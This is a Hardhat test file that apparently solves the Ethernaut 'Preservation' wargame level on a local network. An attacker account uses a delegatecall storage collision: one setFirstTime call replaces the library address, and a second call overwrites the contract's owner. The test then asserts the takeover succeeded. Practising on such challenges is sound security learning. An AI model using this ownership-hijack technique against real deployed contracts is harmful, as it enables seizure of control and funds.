import { expect } from "chai";
import { ethers } from "hardhat";

describe("Preservation", function () {
  it("Claim Owner using delegate call and type conversion", async () => {
    // deploy 먼저
    const [owner, hacker] = await ethers.getSigners();
    const Preservation = await ethers.getContractFactory("Preservation");
    const Library = await ethers.getContractFactory("LibraryContract");
    const HackPreservation = await ethers.getContractFactory("HackPreservation");

    const library = await Library.deploy();
    await library.deployed();

    const preservation = await Preservation.deploy(library.address, library.address);
    await preservation.deployed();

    // storage check
    const ownerAddress = await preservation.owner();
    expect(ownerAddress).to.equal(owner.address);
    console.log("ownerAddress: ", ownerAddress);
    let storage0 = await ethers.provider.getStorageAt(preservation.address, 0);
    let storage1 = await ethers.provider.getStorageAt(preservation.address, 1);
    let storage2 = await ethers.provider.getStorageAt(preservation.address, 2);
    console.log("storage0: ", storage0);
    console.log("storage1: ", storage1);
    console.log("storage2: ", storage2);

    const hackPreservation = await HackPreservation.connect(hacker).deploy();
    await hackPreservation.deployed();
    console.log(hackPreservation.address);

    await preservation.connect(hacker).setFirstTime(hackPreservation.address);
    storage0 = await ethers.provider.getStorageAt(preservation.address, 0);
    console.log("storage0: ", storage0);
    await preservation.connect(hacker).setFirstTime(hacker.address);
    storage2 = await ethers.provider.getStorageAt(preservation.address, 2);
    console.log("hacker.address: ", hacker.address);
    console.log("storage2: ", storage2);
    expect(await preservation.owner()).to.equal(hacker.address);
  });
});
